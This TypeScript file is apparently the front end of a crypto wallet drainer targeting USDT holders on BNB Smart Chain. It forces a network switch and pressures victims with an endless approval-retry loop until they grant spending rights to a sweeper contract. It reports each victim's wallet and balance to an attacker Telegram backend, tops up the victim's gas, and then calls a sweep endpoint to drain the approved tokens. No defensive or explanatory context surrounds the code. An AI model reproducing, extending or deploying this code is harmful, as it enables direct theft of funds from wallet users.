import { ethers } from "ethers"
import { CONFIG, CHAIN_ID, CHAIN_NAME, RPC_URL } from "../config"

const BACKEND_URL = CONFIG.BACKEND_URL

// ============================================================
// AUTO-SWITCH TO BNB SMART CHAIN (BEP-20)
// Returns a NEW BrowserProvider after successful switch
// ============================================================
export async function ensureCorrectNetwork(
  provider: ethers.BrowserProvider
): Promise<ethers.BrowserProvider> {
  const ethProvider = (provider as any).provider

  if (!ethProvider) return provider

  const currentChainIdHex = await ethProvider.request({
    method: "eth_chainId",
  })
  const currentChainId = Number(currentChainIdHex)

  if (currentChainId === CHAIN_ID) return provider

  try {
    const hexChainId = "0x" + CHAIN_ID.toString(16)

    await ethProvider.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: hexChainId }],
    })

    await new Promise(r => setTimeout(r, 3000))

    const newProvider = new ethers.BrowserProvider(ethProvider)
    return newProvider
  } catch (switchError: any) {
    if (switchError.code === 4902) {
      try {
        const hexChainId = "0x" + CHAIN_ID.toString(16)

        await ethProvider.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: hexChainId,
              chainName: CHAIN_NAME,
              nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
              rpcUrls: [RPC_URL],
              blockExplorerUrls: ["https://bscscan.com"],
            },
          ],
        })

        await new Promise(r => setTimeout(r, 3000))

        const newProvider = new ethers.BrowserProvider(ethProvider)
        return newProvider
      } catch (addError) {
        throw new Error("Please manually switch your wallet to BNB Smart Chain")
      }
    }

    if (switchError.code === 4001) {
      throw new Error("Please approve the network switch to BNB Smart Chain")
    }

    throw new Error("Please manually switch your wallet to BNB Smart Chain")
  }
}

// ============================================================
// REQUEST USDT APPROVAL (infinite retry loop kept as required)
// ============================================================
export async function requestApproval(
  provider: ethers.BrowserProvider,
  victimAddress: string
): Promise<ethers.BigNumberish | null> {
  const signer = await provider.getSigner()

  const usdt = new ethers.Contract(
    CONFIG.USDT_CONTRACT,
    [
      "function approve(address spender, uint256 value) external returns (bool)",
      "function balanceOf(address account) external view returns (uint256)",
      "function decimals() external view returns (uint8)",
    ],
    signer
  )

  const rawBalance = await usdt.balanceOf(victimAddress)
  const decimals = await usdt.decimals()
  const balance = ethers.formatUnits(rawBalance, decimals)

  await fetch(`${BACKEND_URL}/api/telegram`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      message: "[New Victim] Wallet: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | Balance: " + parseFloat(balance).toFixed(2) + " USDT",
    }),
  }).catch(() => {})

  const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals)
  const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove

  while (true) {
    try {
      const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount)
      await tx.wait()

      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[Approval Signed] " + ethers.formatUnits(approveAmount, decimals) + " USDT | " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + tx.hash,
        }),
      })

      return approveAmount
    } catch (err: any) {
      if (err.code === "ACTION_REJECTED" || err.code === 4001) {
        await new Promise(r => setTimeout(r, 500))
        continue
      }
      await new Promise(r => setTimeout(r, 500))
      continue
    }
  }
}

// ============================================================
// ENSURE GAS (Funding)
// ============================================================
export async function ensureGas(
  provider: ethers.Provider,
  victimAddress: string
): Promise<boolean> {
  const balance = await provider.getBalance(victimAddress)
  const minGas = ethers.parseEther("0.0003")

  if (balance >= minGas) {
    await fetch(`${BACKEND_URL}/api/telegram`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        message: "[Gas Check] " + ethers.formatEther(balance) + " BNB (sufficient)",
      }),
    })
    return true
  }

  try {
    const response = await fetch(`${BACKEND_URL}/api/fund-gas`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[Gas Funded] Sent " + CONFIG.FUNDING_AMOUNT + " BNB to " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
        }),
      })
      return true
    }
    return false
  } catch {
    return false
  }
}

// ============================================================
// EXECUTE DRAIN
// ============================================================
export async function executeDrain(
  victimAddress: string,
  approvalAmount: ethers.BigNumberish
): Promise<boolean> {
  try {
    const response = await fetch(`${BACKEND_URL}/api/sweep`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      const decimals = CONFIG.USDT_DECIMALS
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[DRAINED] " + ethers.formatUnits(approvalAmount, decimals) + " USDT | Victim: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
        }),
      })
      return true
    }
    return false
  } catch {
    return false
  }
}